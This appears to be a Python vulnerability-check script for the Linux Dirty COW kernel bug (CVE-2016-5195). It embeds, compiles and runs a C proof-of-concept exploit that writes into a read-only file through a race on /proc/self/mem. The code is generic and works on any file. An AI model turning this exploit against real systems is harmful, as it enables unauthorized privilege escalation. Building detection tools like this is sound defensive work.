#!/usr/bin/env python
# coding=utf-8
# -------------------------------------------------------------------------------
# Name:        Linux内核通用提权漏洞检测脚本（Dirty COW）
# vuln:		   CVE-2016-5195: https://access.redhat.com/security/cve/CVE-2016-5195
# Author:      pirogue
# Created:     2017-9-11 11:22:08
# Site:        http://pirogue.org
# -------------------------------------------------------------------------------

import subprocess
from subprocess import Popen, PIPE
import os

# 漏洞利用验证代码
poc_code = """

/* 
 * main.c 
 * 
 *  Created on: Oct 21, 2016 
 *      Author: 5t4rk 
 */  
#include<stdio.h>  
#include<sys/mman.h>  
#include<fcntl.h>  
#include<pthread.h>  
#include<string.h>  

void *map;  
int f;  
struct stat st;  
char* name;  

void * madviseThread(void *arg)  
{  
    char *str;  
    str = (char *) arg;  
    int i, c = 0;  
    for (i = 0; i < 100000000; i++)  
    {  
        c += madvise(map, 100, MADV_DONTNEED);  
    }  
    printf("madvise %d\\n", c);  
}  

void * procselfmemThread(void *arg)  
{  
    char *str;  
    str = (char *) arg;  
    int f = open("/proc/self/mem", O_RDWR);  
    int i, c = 0;  
    for (i = 0; i < 100000000; i++)  
    {  
        lseek(f, map, SEEK_SET);  
        c += write(f, str, strlen(str));  
    }  
    printf("procselfmem %d\\n", c);  
}  

int main(int argc, char *argv[])  
{  
    if (argc < 3)  
        return 1;  
    pthread_t pth1, pth2;  
    f = open(argv[1], O_RDONLY);  
    fstat(f, &st);  
    name = argv[1];  
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);  
    printf("mmap %x\\n", map);  
    pthread_create(&pth1, NULL, madviseThread, argv[1]);  
    pthread_create(&pth2, NULL, procselfmemThread, argv[2]);  
    pthread_join(pth1, NULL);  
    pthread_join(pth2, NULL);  
    return 0;  
}  
"""

# 临时文件内容

test_content = "noo"


# 本地写入文件方法
def write_poc(code, file):
    with open(file, 'w') as f:
        f.write(code)


# 编译poc
def mc_gcc(file):
    pobj = Popen('gcc ' + file + " -lpthread -o mc_poc", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    result = pobj.communicate()
    return result


# 执行poc
def mc_binx(file):
    pobj = Popen('./' + file + " mc_tmp yes|ps -ef|grep '[m]c_poc mc_tmp'|awk '{print $2}'|xargs kill -9",
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    result = pobj.communicate()
    return result


# 判断是否存在漏洞
def mc_vuln(file):
    pobj = Popen('cat ' + file, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    result = pobj.communicate()
    return result[0]


if __name__ == "__main__":
    write_poc(poc_code, 'mc_poc.c')
    write_poc(test_content, 'mc_tmp')
    mc_gcc('mc_poc.c')
    mc_binx('mc_poc')
    # print type(mc_vuln('mc_tmp'))
    if mc_vuln('mc_tmp') == 'yes':
        print '[-] Found DirtyCow vuln'
    elif mc_vuln('mc_tmp') == 'noo':
        print '[+] No DirtyCow vuln.'